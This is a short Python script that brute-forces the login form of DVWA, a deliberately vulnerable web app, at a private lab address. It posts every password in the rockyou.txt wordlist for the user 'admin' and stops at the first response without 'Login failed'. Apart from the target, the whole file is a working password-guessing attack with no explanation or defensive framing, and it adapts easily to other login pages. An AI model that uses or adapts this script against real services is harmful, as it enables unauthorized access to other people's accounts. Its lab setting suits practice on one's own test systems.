import requests
import json

url = "http://192.168.56.101/dvwa/login.php"

payload = {'username':'admin', 'Login':'submit'}

password_list= open('rockyou.txt', encoding="utf-8")

for pwd in password_list.readlines():
    pwd = pwd.strip("\n")
    payload['password'] = pwd
    
    #print(payload)
    
    data = requests.post(url,data=payload)
    response = data.text
    
    if not "Login failed" in response:
        print("Login CORRECTO!!: {}".format(pwd)) 
        break
    else:
        print("LOGIN ERROR : {}".format(pwd))



